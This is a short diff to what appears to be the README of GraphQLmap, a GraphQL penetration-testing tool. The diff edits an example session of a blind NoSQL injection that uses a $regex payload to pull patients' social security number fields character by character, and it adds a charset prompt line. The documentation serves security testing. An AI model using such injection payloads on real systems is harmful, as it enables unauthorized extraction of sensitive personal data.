@@ -134,7 +134,9 @@ Use `BLIND_PLACEHOLDER` inside the query for the `nosqli` function.
 GraphQLmap > nosqli
 Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
 Check > 5d089c51dcab2d0032fdd08d
+Charset > 0123456789abcdef-
 [+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
+GraphQLmap >
 ```
 
 ### SQL injection 
